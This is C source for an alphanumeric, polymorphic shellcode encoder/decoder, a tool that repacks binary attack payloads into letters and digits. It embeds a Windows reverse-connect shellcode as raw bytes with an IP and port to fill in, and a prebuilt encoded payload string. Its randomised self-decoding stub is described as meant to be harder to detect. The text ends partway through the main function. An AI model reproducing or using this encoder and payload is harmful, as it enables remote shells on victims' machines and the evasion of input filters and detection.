/*
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    Alphanumeric Shellcode Encoder Decoder
    Copyright Â© 1985-2008 Avri Schneider - Aladdin Knowledge Systems, Inc. All rights reserved.

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/gpl-3.0.html>.

     +-----------+
      WORKS CITED
     +-----------+
    +--------------------------------------------------------------------------------------------------+
    |Matt Conover, Soren Macbeth, Avri Schneider 05 October 2004                                       |
    |Encode2Alnum (polymorphic alphanumeric decoder/encoder)                                           |
    |Full-Disclosure <http://lists.grok.org.uk/pipermail/full-disclosure/2004-October/027147.html>     |
    |                                                                                                  |
    |CLET Team. Aug. 2003                                                                              |
    |Polymorphic Shellcode Engine                                                                      |
    |Phrack <http://www.phrack.org/show.php?p=61&a=9>                                                  |
    |                                                                                                  |
    |Ionescu, Costin. 1 July 2003                                                                      |
    |Re: GetPC code (was: Shellcode from ASCII)                                                        |
    |Vuln-Dev <http://www.securityfocus.com/archive/82/327348>                                         |
    |                                                                                                  |
    |rix. Aug. 2001                                                                                    |
    |Writing ia32 alphanumeric shellcodes                                                              |
    |Phrack <http://www.phrack.org/show.php?p=57&a=15>                                                 |
    |                                                                                                  |
    |Wever, Berend-Jan. 28 Jan. 2001                                                                   |
    |Alphanumeric GetPC code                                                                           |
    |Vuln-Dev <http://www.securityfocus.com/archive/82/351528>                                         |
    |ALPHA3 <http://skypher.com/wiki/index.php?title=ALPHA3>                                           |
    +--------------------------------------------------------------------------------------------------+
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/
#include <time.h>
#include <stdio.h>
#include <windows.h>

#define MAX_BYTES                            0x100
#define MAX_ENCODED_SHELLCODE                2000 //this will be allocated on the stack
#define MIN_IP_STR_LEN                       7
#define MAX_IP_STR_LEN                       15

#define OFFSET_XOR_AL1_A                     15
#define OFFSET_XOR_AL1_B                     18
#define OFFSET_XOR_AL2_A                     37
#define OFFSET_XOR_AL2_B                     40
#define OFFSET_PUSH_DWORD1                   0
#define OFFSET_PUSH_DWORD2                   1
#define OFFSET_PUSH_DWORD3                   4
#define OFFSET_PUSH_DWORD4                   12
#define OFFSET_RANDOMIZED_DECODER_HEAD       14
#define SIZE_RANDOMIZED_DECODER_HEAD         16
BYTE EncodedShellcode[] = // encoded 336 bytes
        "PZhUQPTX5UQPTHHH4D0B8RYkA9YA3A9A2B90B9BhPTRWX5PTRW4r8B9ugxPqy8xO"
        "wck4WTyhlLlUjyhukHqGCixVLt4UTCBRwsV3pRod8OLMKO9FXJVTJJbJX4gsVXAt"
        "Q3ukAxFmVIw7HyBfDyNv5zXqg4PQeTxZJLm56vRjSidjSz75mHb2RL5Hl30tUmnH"
        "HtXEv7oZVdiEv1QwWijcgVk4CZn7NI3uRai32AZ7FS0Iq1cwWc5T5RlnTIiKJVmq"
        "4T4MElucobfP4vWyB0OfB34JRJ9T4zjLlbKmlk7jTicj11869F001uAdTZKNJ7wL"
        "mOv5mLlGPKFLtNI2525WhktKDO0NIlseHIuJ33xv7xGQAW55eZKXHw78zfvCI2U0"
        "9Ulw5ZZhynmxG7JZZgJAYbg1MEp5QcOv7AYkYfcHQDWVMlJnzOSh8nzg1NZZn5Px"
        "11U5INVEtvZOS1E094HqmbB6K1MfRIq7KQyNOeL7NHI1Xnwhyhy69bg2bTexGnkc"
        "CEt90vn3DaFxGaFuRIPg0NK40kdg0L9ImaFbGy1Wl7JyGeJByHdfRCSYzvCzVa2v"
        "RtQWG5lxRMN1CZREvyKFvfwij3X2P81J1wk9ZLmGAqxGPuQv7RBX411iaWKCLGnD"
        "kwRZKREaRis5V7c5ILxKfAx6MbH40T53PnX9ZwSWtYzbHwCzkS0Ev5iVmLmS3xSk"
        "1telLPYuGyNvX1TyJ3yLdOwckr";

// example: make encoder choose more uppercase bytes...
#define ADDITIONAL_CHARSET                   "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

#define ALNUM_CHARSET    ADDITIONAL_CHARSET  "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" // <--- allowed charset
                                                                                                              //      feel free to
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////change - YMMV
#define REGISTER_WITH_ADDRESS_OF_SHELLCODE   esp // <--- change this to the register holding the address of the decoder////////////
#define _Q(str) #str
#define Q(str) _Q(str)
#define P(str) #str ##" // <--- buffer offset\n"## _Q(str)
///////////////////////////////////
#define CONNECT_BACK_SHELLCODE   //
//#undef  CONNECT_BACK_SHELLCODE //undefine CONNECT_BACK_SHELLCODE to use your own - and place it in shellcode[] >-----------------.
                                 ///////////////////////////////////////////////////////////////////                               |
int main();                                                                                       //                               |
UCHAR *scan_str_known_pattern(UCHAR *alnum_str, UCHAR *known_pattern, UINT known_pattern_length); //                               |
UCHAR get_push_register_instruction(UCHAR *reg);                                                  //                               |
UCHAR get_random_alnum_value();                                                                   //                               |
UCHAR get_random_alnum_push_dword_opcode();                                                       //                               |
UCHAR *get_nop_slide(UINT size, UINT slide);                                                      ///////                          |
UCHAR *slide_substr_forward(UCHAR *str, UINT substr_offset, UINT substr_len, UINT str_len, UINT slide);//                          |
UCHAR *slide_substr_back(UCHAR *str, UINT substr_offset, UINT substr_len, UINT str_len, UINT slide);   //                          |
UCHAR *shuffle(UCHAR str[], UINT length);                                                         ///////                          |
DWORD my_htonl(DWORD dw_in);                                                                      //                               |
DWORD ip_str_to_dw(UCHAR *str);                                                                   //                               |
BOOL terminating_key_exist(UCHAR *alnum_shellcode, UCHAR *terminating_key);                       //                               |
BOOL is_alnum(UCHAR c);                                                                           //                               |
BOOL str_is_alnum(UCHAR *str);                                                                    //                               |
UCHAR get_two_xor_complemets_for_byte_and_xor(UCHAR byte, UCHAR xor, int index);                  //                               |
UCHAR *randomize_decoder_head(UCHAR *decoder, UINT size_decoder, UCHAR xor_al1, UCHAR jne_xor1);  //                               |
struct xor2_key *get_xor2_and_key_for_xor1_and_c(UCHAR xor1, UCHAR c);                            //                               |
struct xor2_key *choose_random_node(struct xor2_key *head);                                       //                               |
void free_p_xor2_key(struct xor2_key *node);                                                      //                               |
                                                                                                  //                               |
struct xor2_key {                                                                                 //                               |
    UCHAR xor2;                                                                                   //                               |
    UCHAR key;                                                                                    //                               |
    struct xor2_key *prev;                                                                        //                               |
    struct xor2_key *next;                                                                        //                               |
} xor2_key;                                                                                       //                               |
                                                                                                  //                               |
                                                                                                  //                               |
//  Title:      Win32 Reverse Connect                                                             //                               |
//  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003                            //                               |
//  Author:     hdm[at]metasploit.com                                                             //                               |
#ifdef CONNECT_BACK_SHELLCODE                                                                     //                               |
    #define OFFSET_IP_ADDRESS                    154                                              //                               |
    #define OFFSET_TCP_PORT_NUMBER               159                                              //                               |
    #define IP_ADDRESS                           "127.0.0.1"                                      //                               |
    #define TCP_PORT_NUMBER                      123                                              //                               |
    DWORD ip_address;                                                                             //                               |
    UCHAR shellcode[] =                                                                           //                               |
                    "\xe8\x30\x00\x00\x00\x43\x4d\x44\x00\xe7\x79\xc6\x79\xec\xf9\xaa"            //                               |
                    "\x60\xd9\x09\xf5\xad\xcb\xed\xfc\x3b\x8e\x4e\x0e\xec\x7e\xd8\xe2"            //                               |
                    "\x73\xad\xd9\x05\xce\x72\xfe\xb3\x16\x57\x53\x32\x5f\x33\x32\x2e"            //                               |
                    "\x44\x4c\x4c\x00\x01\x5b\x54\x89\xe5\x89\x5d\x00\x6a\x30\x59\x64"            //                               |
                    "\x8b\x01\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x58\x08\xeb\x0c\x8d\x57"            //                               |
                    "\x24\x51\x52\xff\xd0\x89\xc3\x59\xeb\x10\x6a\x08\x5e\x01\xee\x6a"            //                               |
                    "\x08\x59\x8b\x7d\x00\x80\xf9\x04\x74\xe4\x51\x53\xff\x34\x8f\xe8"            //                               |
                    "\x83\x00\x00\x00\x59\x89\x04\x8e\xe2\xeb\x31\xff\x66\x81\xec\x90"            //                               |
                    "\x01\x54\x68\x01\x01\x00\x00\xff\x55\x18\x57\x57\x57\x57\x47\x57"            //                               |
                    "\x47\x57\xff\x55\x14\x89\xc3\x31\xff\x68"                                    //                               |
                    "IPIP" // I.P. address                                                        //                               |
                    "\x68"                                                                        //                               |
                    "PORT" // TCP port number                                                     //                               |
                    "\x89\xe1\x6a\x10\x51\x53\xff\x55\x10\x85\xc0\x75\x44\x8d\x3c\x24"            //                               |
                    "\x31\xc0\x6a\x15\x59\xf3\xab\xc6\x44\x24\x10\x44\xfe\x44\x24\x3d"            //                               |
                    "\x89\x5c\x24\x48\x89\x5c\x24\x4c\x89\x5c\x24\x50\x8d\x44\x24\x10"            //                               |
                    "\x54\x50\x51\x51\x51\x41\x51\x49\x51\x51\xff\x75\x00\x51\xff\x55"            //                               |
                    "\x28\x89\xe1\x68\xff\xff\xff\xff\xff\x31\xff\x55\x24\x57\xff\x55"            //                               |
                    "\x0c\xff\x55\x20\x53\x55\x56\x57\x8b\x6c\x24\x18\x8b\x45\x3c\x8b"            //                               |
                    "\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x32\x49"            //                               |
                    "\x8b\x34\x8b\x01\xee\x31\xff\xfc\x31\xc0\xac\x38\xe0\x74\x07\xc1"            //                               |
                    "\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c\x24\x14\x75\xe1\x8b\x5a\x24\x01"            //                               |
                    "\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\xeb"            //                               |
                    "\x02\x31\xc0\x89\xea\x5f\x5e\x5d\x5b\xc2\x08\x00";                           //                               |
#else                                                         //////////////////////////////////////                               |
    UCHAR shellcode[] = "\xCC YOUR SHELLCODE GOES HERE \xCC"; // <----------------- here ------------------------------------------'
#endif                                                        //
DWORD size = sizeof(shellcode)-1;                             //
                                                              //
int main() {                                                  /////////////////////////////////////////////////////////
    //(decoder address is in ecx when decoder starts)                                                                //
    UCHAR PUSH_REGISTER_WITH_DECODER_ADDRESS = get_push_register_instruction(Q(REGISTER_WITH_ADDRESS_OF_SHELLCODE)); // >----------.
//                                                                                                                   //            |
#define END_OF_ENCODED_SHELLCODE    'A','L','D','N' // this is the terminating string of the encoded shellcode       //            |
    UCHAR str_end_of_encoded_shellcode[]= {END_OF_ENCODED_SHELLCODE};  ////////////////////////////////////////////////            |
    UCHAR xor_al1                       = get_random_alnum_value();    // this is used to zero out AL the first time               |
    UCHAR xor_al2                       = get_random_alnum_value();    // this is used to zero out AL the second time              |
    int offset_imul_key                 = '\xC1';////////////////////////                                                          |
    int jne_xor1                        = '\xC2';//                 >---------------------------------------------------------.    |
    int jne_xor2                        = '\xC3';//            >--------------------------------------------------------------|    |
                                                 // you would need to play with these two values if you want to reduce        |    |
                                                 // the size of the NOP slides - they obviously need to stay alnum.           |    |
                                                 // You could also play with the value of AL before the XOR is done           |    |
                                                 // to get your desired negative offset. keep in mind that it will cost       |    |
                                                 // you instructions to get al to the value you want (if you use xor of       |    |
                                                 // two alphanumeric bytes, you would need to push first alphanumeric         |    |
                                                 // char to the stack, pop eax, then xor it with it's alnum complement)       |    |
                                                 // This playing around would result in an even harder to detect decoder      |    |
                                                 // as the offsets would be different                                         |    |
    int size_decoder                    ='\xC4'; //                                                                           |    |
    int half_size_decoder               ='\xC5'; ////////////////////////////////////////////////////////////////////         |    |
    UCHAR imul_instruction_1            ='\x6B';                                                                   //         |    |
    UCHAR imul_instruction_2            ='\x41';                                                                   //         |    |
    UCHAR imul_instruction_3            ='\xC6'; //size of decoder+1                                               //         |    |
    UCHAR imul_instruction_4            ='\xC7'; //initial key (random alnum)                                      //         |    |
    //                                                                                                             //         |    |
    UINT column=0, i=0;                                                               ///////////////////////////////         |    |
    UCHAR *alnum = ALNUM_CHARSET;                                                     //                                      |    |
    UCHAR *p_alnum = alnum;                                                           //                                      |    |
    UCHAR decoder[] =                                                                 //                                      |    |
    {   ////////////////////////////////////////////////////////////////////////////////                                      |    |
        //                                                                                                                    |    |
        //[step_1] -- multiply first encoded byte with key                                                                    |    |
        //[step_2] -- xor result of step_1 with second encoded byte to get the decoded byte                                   |    |
        //                                                                                                                    |    |
        // Each binary byte is encoded into three alphanumeric bytes.                                                         |    |
        // The first byte multipled by the third byte xor'ed against the second byte yeilds the original                      |    |
        // binary byte.                                                                                                       |    |
        //                                                                                                                    |    |
        // TODO:                                                                                                              |    |
        //    .--(first byte  ^ second byte) * third byte                                                                     |    |
        //    '--(second byte ^  first byte) * third byte                                                                     |    |
        //                                                                                                                    |    |
        //    .--(first byte  ^  third byte) * second byte                                                                    |    |
        //    '--(third byte  ^  first byte) * second byte                                                                    |    |
        //                                                                                                                    |    |
        //    .--(second byte ^  third byte) * first byte                                                                     |    |
        //    '--(third byte  ^ second byte) * first byte                                                                     |    |
        //                                                                                                                    |    |
        //    .--(first byte  * second byte) ^ third byte                                                                     |    |
        //    '--(second byte *  first byte) ^ third byte                                                                     |    |
        //                                                                                                                    |    |
        //    .--(first byte  *  third byte) ^ second byte <-- decoder/encoder implemented                                    |    |
        //    '--(third byte  *  first byte) ^ second byte <-- decoder implemented (same encoder)                             |    |
        //                                                                                                                    |    |
        //    .--(second byte *  third byte) ^ first byte                                                                     |    |
        //    '--(third byte  * second byte) ^ first byte                                                                     |    |
        //                                                                                                                    |    |
        //                                                                                                                    |    |
        // The above is divided into pairs, each pair has the same values (in parenthesis) just at different offsets,         |    |
        // and we can switch them around with no effect. Each option requires a different decoder, but each pair can use the  |    |
        // same encoder.                                                                                                      |    |
        //                                                                                                                    |    |
            /////////// DECODER HEAD (will be randomized by sliding instructions) //////// >----------------------------------|----|---.
   /* 1*/   '\x50',                                   //push ???  (this can change)     // [eax = address of decoder]------+  |    |   |
   /* 2*/   '\x50',                                   //push ???  (this can change)     // [ecx = address of decoder]------+  |    |   |
   /* 3*/   PUSH_REGISTER_WITH_DECODER_ADDRESS,       //push reg  (decoder address)     // [edx = address of decoder]------+  |    |   |
   /* 4*/   PUSH_REGISTER_WITH_DECODER_ADDRESS,       //push reg  (base offset for cmp) // [ebx = address of decoder]------+  |    |   |
   /* 5*/   '\x50',                                   //push ???  (this can change)     // [esp = address of decoder]------+  |    |   |
   /* 7*/   '\x6A', half_size_decoder,                //push 35h  (word offset for cmp) // [ebp = decoder size / 2]--------+  |    |   |
   /*12*/   '\x68', END_OF_ENCODED_SHELLCODE,         //push END_OF_ENCODED_SHELLCODE   // [esi = 4 bytes terminating key]>+  |    |   |
   /*13*/   '\x50',                                   //push ???  (this can change)     // [edi = address of decoder]------+  |    |   |
   /*14*/   '\x61',                                   //popad                           // [set all registers] <-----------'  |    |   |
   /*16*/   '\x6A', xor_al1, //last decoder byte=0xB1 //push XOR_AL1    [JNE_XOR1^0xFF=al^JNE_XOR2=last byte==0xB1] >----.    |    |   |
   /*17*/   '\x58',                                   //pop  eax       <-------------------------------------------------'    |    |   |
   /*19*/   '\x34', xor_al1,                          //xor  al,XOR_AL1        [al = 0x00]                                    |    |   |
   /*20*/   '\x48',                                   //dec  eax               [al = 0xFF] [you can play with AL here...]<----'    |   |
   /*22*/   '\x34', jne_xor1,                         //xor  al,JNE_XOR1            [al = 0xFF ^ JNE_XOR1]                         |   |
   /*25*/   '\x30', '\x42', size_decoder-1,           //xor  byte ptr [edx+size],al >--change-last-byte--.                         |   |
   /*26*/   '\x52',                                   //push edx     [save decoder address on stack]     |                         |   |
   /*27*/   '\x52',                                   //push edx     >----.                              |                         |   |
   /*28*/   '\x59',                                   //pop  ecx   <------'  [ecx = address of decoder]  |                         |   |
   /*29*/   '\x47',                                   //inc edi    we increment ebx keeping the decoder  |                         |   |
   /*30*/   '\x43',                                   //inc ebx    length non-even (edi is unused)       |                         |   |
            //////////////// DECODER_LOOP_START ///////////////////////////////////////////              |                         |   |
   /*31*/   '\x58',      //get address of the decoder //pop  eax                          <---------. <--|-----------------.       |   |
   /*32*/   '\x52',      //save edx                   //push edx   [can use edx now]>---------------|----|---------------. |       |   |
   /*33*/   '\x51',      //save ecx                   //push ecx   [can use ecx now]   >------------|----|-------------. | |       |   |
   /*34*/   '\x50',      //save address of decoder    //push eax   [can use eax now]      >---------|----|-----------. | | |       |   |
   /*35*/   '\x50',      //save eax                   //push eax   >----.                           |    |           | | | |       |   |
   /*36*/   '\x5A',      //restore into edx           //pop  edx <------'                           |    |           | | | |       |   |
   /*38*/   '\x6A', xor_al2, //zero out al            //push XOR_AL2    [al = 0] >----.             |    |           | | | |       |   |
   /*39*/   '\x58',          //zero out al            //pop  eax                      |             |    |           | | | |       |   |
   /*41*/   '\x34', xor_al2, //zero out al            //xor  al,XOR_AL2    <----------'             |    |           | | | |       |   |
   /*42*/   '\x50',      //save al on the stack (al=0)//push eax            >-----------------.     |    |           | | | |       |   |
   /*45*/   '\x32', '\x42', offset_imul_key,          //xor  al,byte ptr [edx+off]            |     |    |           | | | |       |   |
   /*48*/   '\x30', '\x42', offset_imul_key,          //xor  byte ptr [edx+off],al >--this-zero's-the-key----.       | | | |       |   |
   /*49*/   '\x58', //restore al from the stack (al=0)//pop  eax       <----------------------'     |    |   |       | | | |       |   |
   /*52*/   '\x32', '\x41', size_decoder+2, // get key in al  //xor  al,byte ptr [ecx+size+2]       |    |   |       | | | |       |   |
   /*55*/   '\x30', '\x42', offset_imul_key,          //xor  byte ptr [edx+off],al >---this-changes-the-key--|----.  | | | |       |   |
   /*56*/   '\x58',      //restore address of decoder //pop  eax  <---------------------------------|----|---|----|--' | | |       |   |
   /*57*/   '\x59',      //restore ecx [word offset]  //pop  ecx     <------------------------------|----|---|----|----' | |       |   |
   /*58*/   '\x5A',      //restore edx [byte offset]  //pop  edx        <---------------------------|----|---|----|------' |       |   |
   /*59*/   '\x50',      //save address of decoder    //push eax  >---------------------------------|----|---|----|--------'       |   |
            /////////// START NOP_SLIDE_1 /////////////////////////////////////////////////         |    |   |    |                |   |
   /*60*/   '\x41',/////////////////////////////////////inc  ecx///////////////////////////         |    |   |    |                |   |
   /*61*/   '\x49',/////////////////////////////////////dec  ecx///////////////////////////         |    |   |    |                |   |
   /*62*/   '\x41',/////////////////////////////////////inc  ecx///////////////////////////         |    |   |    |                |   |
   /*63*/   '\x49',/////////////////////////////////////dec  ecx+-----------------------+//         |    |   |    |                |   |
   /*64*/   '\x41',//     IMUL can go here and bellow //inc  ecx|                       |//         |    |   |    |                |   |
   /*65*/   '\x49',//                                 //dec  ecx|   16 bytes            |//         |    |   |    |                |   |
   /*66*/   '\x41',//                                 //inc  ecx|   NOP slide           |//         |    |   |    |                |   |
   /*67*/   '\x49',//                                 //dec  ecx|                       |//         |    |   |    |                |   |
   /*68*/   '\x41',//                                 //inc  ebx| can mungle eax until  |//         |    |   |    |                |   |
   /*69*/   '\x49',//       will be randomized        //dec  ebx| IMUL_INSTRUCTION      |//         |    |   |    |                |   |
   /*70*/   '\x41',//                                 //inc  edx|                       |//         |    |   |    |                |   |
   /*71*/   '\x49',//                                 //dec  edx|                       |//         |    |   |    |                |   |
   /*72*/   '\x41',//                                 //inc  esi|                       |//         |    |   |    |                |   |
   /*73*/   '\x49',//                                 //dec  esi+-----------------------+//         |    |   |    |                |   |
   /*74*/   '\x41',//                                 //push eax///////////////////////////         |    |   |    |                |   |
   /*75*/   '\x49',//                                 //pop  eax//////////////////////// //         |    |   |    |                |   |
            //////////// END NOP_SLIDE_1 //////////////////////////////////////////////////         |    |   |    |                |   |
            //                                                                                      |    |   |    |                |   |
            // We can move around the IMUL_INSTRUCTION inside the NOP slides - but not before       |    |   |    |                |   |
            // MAX_OFFSET_OFFSET_IMUL i.e. we can't move it before the first 4 bytes of NOP_SLIDE_1 |    |   |    |                |   |
            // or the offset will not be alphanumeric.                                              |    |   |    |                |   |
            //                                                                                      |    |   |    |                |   |
            // We need to move the IMUL_INSTRUCTION in two byte increments, as we may modify eax in |    |   |    |                |   |
            // NOP_SLIDE_1 and we can't change eax after the IMUL_INSTRUCTION (as the result goes   |    |   |    |                |   |
            // into eax) - this limitation can be overcome if we make sure not to modify eax after  |    |   |    |                |   |
            // the IMUL_INSTRUCTION - and it is easy enough, as we don't care about eax' value at   |    |   |    |                |   |
            // all - so we don't need to restore it. We can simply increment or decrement an unused |    |   |    |                |   |
            // register instead. We happen to have such a register - edi =]                         |    |   |    |                |   |
            //                                                                                      |    |   |    |                |   |
            // So in NOP_SLIDE_1, we can't use push eax;pop eax unless they will not be split by    |    |   |    |                |   |
            // the IMUL_INSTRUCTION - because we would need the value of eax after the imul, and    |    |   |    |                |   |
            // the pop eax would overwrite it                                                       |    |   |    |                |   |
            //                                                                                      |    |   |    |                |   |
            // But we could use a dec eax;inc edi or a dec eax;dec edi combinations (inc eax is not |    |   |    |                |   |
            // alphanumeric.).                                                                      |    |   |    |                |   |
            //                                                                                      |    |   |    |                |   |
            // -OBSOLETE-                                                                           |    |   |    |                |   |
            // I have set here the IMUL_INSTRUCTION between NOP_SLIDE_1 and NOP_SLIDE_2             |    |   |    |                |   |
            // If you wish to move it up, you will need to move it up by an even number of bytes.   |    |   |    |                |   |
            // You will then need to change OFFSET_OFFSET_IMUL accordingly                          |    |   |    |                |   |
            // (add the number of bytes to it)                                                      |    |   |    |                |   |
            // If you wish to move it down, you will need to move it down by an even number of      |    |   |    |                |   |
            // bytes.                                                                               |    |   |    |                |   |
            // You will then need to change OFFSET_OFFSET_IMUL accordingly                          |    |   |    |                |   |
            // (deduct the number of bytes from it)                                                 |    |   |    |                |   |
            //                                                                                      |    |   |    |                |   |
            // TODO: make a routine that moves it around randomally between allowed values          |    |   |    |                |   |
            // and sets the proper offsets                                                          |    |   |    |                |   |
            // this routine should be called after the NOP slides have been randomized.             |    |   |    |                |   |
            //                                                                                      |    |   |    |                |   |
            ////////// START NOP_SLIDE_2 ////////////////////////////////////////////////////       |    |   |    |                |   |
   /*76*/   '\x41',//                                   //inc  ecx///////////////////////////       |    |   |    |                |   |
   /*77*/   '\x49',//                                   //dec  ecx///////////////////////////       |    |   |    |                |   |
   /*78*/   '\x41',//                                   //inc  ebx///////////////////////////       |    |   |    |                |   |
   /*79*/   '\x49',//                                   //dec  ebx+-----------------------+//       |    |   |    |                |   |
   /*80*/   '\x41',//      will be randomized           //inc  edx|                       |//       |    |   |    |                |   |
   /*81*/   '\x49',//                                   //dec  edx|   12 bytes            |//       |    |   |    |                |   |
   /*82*/   '\x41',//                                   //inc  esi|   NOP slide           |//       |    |   |    |                |   |
   /*83*/   '\x49',//                                   //dec  esi|                       |//       |    |   |    |                |   |
   /*84*/   '\x41',//                                   //push eax|                       |//       |    |   |    |                |   |
   /*85*/   '\x49',//                                   //pop  eax|                       |//       |    |   |    |                |   |
   /*86*/   '\x41',//                                   //inc  ecx+-----------------------+//       |    |   |    |                |   |
   /*87*/   '\x49',//                                   //dec  ecx///////////////////////////       |    |   |    |                |   |
            //           IMUL can go down to here                                                   |    |   |    |                |   |
            /////////           [step_1]   //imul eax,dword ptr [ecx+size_decoder+1],45h            |    |   |    |                |   |
   /*91*/imul_instruction_1, imul_instruction_2, imul_instruction_3, imul_instruction_4,// <-This-key-will-change-'                |   |
            ////////// END NOP_SLIDE_2////////////////////////////////////////////////////          |    |                         |   |
   /*92 */  '\x41',      //ecx incremented once       //inc  ecx  ---------------------.            |    |                         |   |
   /*95 */  '\x33', '\x41', size_decoder,   //[step_2]//xor  eax,dword ptr [ecx+size]  | <--------------------store decoded        |   |
   /*98 */  '\x32', '\x42', size_decoder,             //xor  al,byte ptr [edx+size]    |ecx = ecx+2 |    |    byte                 |   |
   /*101*/  '\x30', '\x42', size_decoder,             //xor  byte ptr [edx+size],al    |            |    |(eax=result of IMUL)     |   |
   /*102*/  '\x41',      //ecx incremented twice      //inc  ecx  ---------------------'            |    |                         |   |
   /*103*/  '\x42',      //edx incremented once       //inc  edx                        edx = edx+1 |    |                         |   |
   /*104*/  '\x45',      //ebp incremented once       //inc  ebp                                    |    |                         |   |
   /*107*/  '\x39', '\x34', '\x6B',         //cmp  dword ptr [ebx+ebp*2],esi // check if we reached the end                        |   |
   /*109*/  '\x75', jne_xor2,               // <===0xB1   //jne  DECODER_LOOP_START  >--------------' <--'                         |   |
            '\x00' // If you change the length of the decoder, the jne would need to jump to a different offset than 0xB1          |   |
    };//////////////////////////////////////////////////                                                                           |   |
    UINT shrink;                                      //                                                                           |   |
    UCHAR *found_msg;                                 //                                                                           |   |
    UCHAR *p_decoder = decoder;                       //                                                                           |   |
    UCHAR xor1, xor2, key;                            //                                                                           |   |
    UCHAR temp_buf[3] = "";                           //                                                                           |   |
    UCHAR alnum_shellcode[MAX_ENCODED_SHELLCODE] = "";//                                                                           |   |
    UCHAR *p_alnum_shellcode = alnum_shellcode;       //                 todo: allow for the key to be either the first,           |   |
    struct xor2_key *p_xor2_key = 0;                  //                       the second or the third byte (currently third).     |   |
    UCHAR *p_shellcode = shellcode;                   //                                                                           |   |
    void *_eip = 0;                                   //                                                                           |   |
                                                      //                                                                           |   |
    int offset_nop_slide1;                            //                                                                           |   |
    int offset_nop_slide2;                            //                                                                           |   |
    int offset_half_size_decoder;                     //                                                                           |   |
    int offset_terminating_key;                       //                                                                           |   |
    int offset_imul_instruction1;                     //                                                                           |   |
    int offset_imul_instruction2;                     //                                                                           |   |
    int offset_imul_instruction3;                     //                                                                           |   |
    int offset_imul_instruction4;                     //                                                                           |   |
    int negative_offset_size_decoder1;                //                                                                           |   |
    int negative_offset_size_decoder2;                //                                                                           |   |
    int negative_offset_size_decoder3;                //                                                                           |   |
    int offset_size_decoder_min_1;                    //                                                                           |   |
    int offset_size_decoder_pls_2;                    //                                                                           |   |
    int offset_imul_key_offset1;                      //                                                                           |   |
    int offset_imul_key_offset2;                      //                                                                           |   |
    int offset_imul_key_offset3;                      //                                                                           |   |
    int offset_imul_instruction;                      //                                                                           |   |
    int size_nop_slide1;                              //                                                                           |   |
    int size_nop_slide2;                              //                                                                           |   |
    int offset_jne_xor1;                              //                                                                           |   |
    int offset_jne_xor2;                              //                                                                           |   |
    int decoder_length_section1;                      //                                                                           |   |
    int decoder_length_section2;                      //                                                                           |   |
    int decoder_length_section3;                      //                                                                           |   |
    int imul_instruction_length;                      //                                                                           |   |
    int jne_xor_negative_offset;                      //                                                                           |   |
    int backward_slide_offset;                        //                                                                           |   |
    BOOL decoder_version_1;                           //                                                                           |   |
    UINT srand_value;                                 //                                                                           |   |
#ifdef CONNECT_BACK_SHELLCODE                         /////////////////////////////////////////////                                |   |
    printf("scanning EncodedShellcode for shellcode up to OFFSET_IP_ADDRESS bytes\n");           //                                |   |
    found_msg = scan_str_known_pattern(EncodedShellcode, shellcode, OFFSET_IP_ADDRESS);          //                                |   |
    if (found_msg) printf("shellcode found encoded in EncodedShellcode using %s.\n", found_msg); //                                |   |
    else printf("shellcode not found encoded in EncodedShellcode.\n");/////////////////////////////                                |   |
#endif                                                //////////////////                                                           |   |
    printf("shellcode length:%d\n", size);            //                                                                           |   |
    srand_value = time(NULL);                         //                                                                           |   |
//  srand_value =           ;                         // for debugging                                                             |   |
    srand(srand_value);                               //                                                                           |   |
    printf("srand value=%d\n", srand_value);          //                                                                           |   |
    decoder_version_1 = rand() % 2;                   //                                                                           |   |
                                                      /////                                                                        |   |
    size_decoder                       = strlen(decoder);//                                                                        |   |
    decoder_length_section1            = 30; //////////////                                                                        |   |
    decoder_length_section2            = 29; //                                                                                    |   |
    decoder_length_section3            = 18; //                                                                                    |   |
                                             //                                                                                    |   |
    size_nop_slide1                    = 28; //                                                                                    |   |
    size_nop_slide2                    = 0;  //                                                                                    |   |
                                             //                                                                                    |   |
    imul_instruction_length            = 4;  //                                                                                    |   |
                                             //                                                                                    |   |
    shrink = (rand()%6)*2;                   //////////////////////////////////////////////////// (can shrink up to 10 bytes       |   |
    memmove(decoder+decoder_length_section1+decoder_length_section2+size_nop_slide1-shrink,    //  in 2 byte increments)           |   |
            decoder+decoder_length_section1+decoder_length_section2+size_nop_slide1,           //                                  |   |
                      imul_instruction_length+size_nop_slide2+decoder_length_section3+1);      //                                  |   |
    size_decoder -=shrink;                ///////////////////////////////////////////////////////                                  |   |
    half_size_decoder = size_decoder/2;   //                                                                                       |   |
    size_nop_slide1 -=shrink;             /////////////////////////                                                                |   |
    printf("shrinking decoder by: %d\n", shrink);                //                                                                |   |
                                                                 //                                                                |   |
    offset_imul_instruction            = decoder_length_section1+//                                                                |   |
                                         decoder_length_section2+//                                                                |   |
                                         size_nop_slide1;//////////                                                                |   |
                                                         //                                                                        |   |
    backward_slide_offset = rand() % 15;                 //    (selects a number from 0 to 14 in increments of 1)                  |   |
    strncpy(decoder,                                     //                                                                        |   |
            slide_substr_back(decoder,                   //                                                                        |   |
                              offset_imul_instruction,   //                                                                        |   |
                              imul_instruction_length,   //                                                                        |   |
                              size_decoder,           /////                                                                        |   |
                              backward_slide_offset), //                                                                           |   |
            size_decoder);                            //                                                                           |   |
    offset_imul_instruction -=backward_slide_offset;  //                                                                           |   |
    size_nop_slide1         -=backward_slide_offset;  //                                                                           |   |
    size_nop_slide2         +=backward_slide_offset;  //////////////                                                               |   |
    printf("backward_slide_offset = %d\n", backward_slide_offset);//                                                               |   |
                                                                  ///////////////////////////////////                              |   |
